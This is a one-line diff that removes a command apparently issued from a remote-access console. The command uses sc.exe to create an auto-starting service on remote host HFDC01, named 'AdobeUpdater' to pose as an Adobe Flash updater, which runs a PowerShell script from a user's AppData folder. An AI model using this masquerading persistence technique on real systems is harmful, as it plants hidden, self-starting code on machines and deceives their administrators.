@@ -1,1 +1,0 @@
-shell C:\WINDOWS\system32\sc.exe `\`\HFDC01 create AdobeUpdater binPath= "cmd.exe /c `\`"powershell -command C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\update.ps1`\`" " DisplayName= "Adobe Flash Updater" start= auto
